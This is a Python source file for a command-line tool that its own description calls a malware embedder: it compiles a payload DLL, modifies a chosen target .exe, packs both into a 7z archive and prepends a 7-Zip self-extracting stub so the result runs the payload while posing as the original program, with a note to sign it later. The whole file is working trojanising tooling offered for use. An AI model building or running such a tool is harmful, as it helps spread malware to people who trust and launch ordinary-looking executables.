from vendor import disitool
import os
import py7zr
import shutil
import tempfile
import platform
import argparse

__dir__ = os.path.dirname(__file__)

def build_payload(path: str) -> str:
    os.system(f"cd '{path}' && make payload.dll")
    return os.path.join(path, 'payload.dll')

def build_mod_exe(exe_path: str, dll_path: str, out_exe_path: str) -> str:
    path = os.path.join(os.getcwd(), exe_path)
    with tempfile.TemporaryDirectory() as tempDir:
        sfx = os.path.join(__dir__, "embed/tools/7zS.sfx")
        tempOut = os.path.join(tempDir, "tmp.exe")
        outFileName = exe_path.split(os.path.sep)[-1]
        tempOutFile = os.path.join(tempDir, outFileName)

        _7zOutFile = os.path.join(tempDir, "bundle.7z")
        tempConfigFile = os.path.join(tempDir, "config.txt")

        os.system(f"cd {__dir__}/embed && make embed.exe")
        if platform.system() == "Windows":
            os.system(f"cd {__dir__}/embed && embed.exe {path} {tempOutFile}")
        else:
            os.system(f"cd {__dir__}/embed && wine64 embed.exe {path} {tempOutFile}")
        
        with open(os.path.join(__dir__, "embed/tools/config.txt")) as configTemplate:
            config = configTemplate.read().format(outFileName)

        with open(tempConfigFile, "w") as configOut:
            configOut.write(config)
            print("[+] Generated config\n" + config)

        with py7zr.SevenZipFile(_7zOutFile, 'w') as z:
            z.writef(open(tempOutFile, 'rb'), outFileName)
            z.writef(open(dll_path, 'rb'), 'payload.dll')
            print("[+] Created 7z file " + _7zOutFile)
            
            for file in z.files:
                print("[+] - File " + file.filename)

        with open(tempOut, 'wb') as exe:
            sfxFile = open(sfx, 'rb')
            configFile = open(tempConfigFile, 'rb')
            _7zBundleFile = open(_7zOutFile, 'rb')

            exe.write(sfxFile.read())
            exe.write(configFile.read())
            exe.write(_7zBundleFile.read())

            sfxFile.close()
            configFile.close()
            _7zBundleFile.close()

        # TODO: Sign temp.exe

        shutil.copy(tempOut, out_exe_path)

    return out_exe_path

def main():
    parser = argparse.ArgumentParser(
        "embed.py",
        description="A malware embedder designed to create malware laden EXEs from a base EXE"
    )

    parser.add_argument("-p", "--payload", required=True, help="Path to the payload directory")
    parser.add_argument("-t", "--target", required=True, help="The target .exe file you want to attach the payload")
    parser.add_argument("-o", "--output", required=True, help="The output path of the generated exe")

    args = parser.parse_args()
    print(args)

    payload_path = build_payload(args.payload)
    out_exe = build_mod_exe(args.target, payload_path, args.output)

    print(out_exe)

    
if __name__ == "__main__":
    main()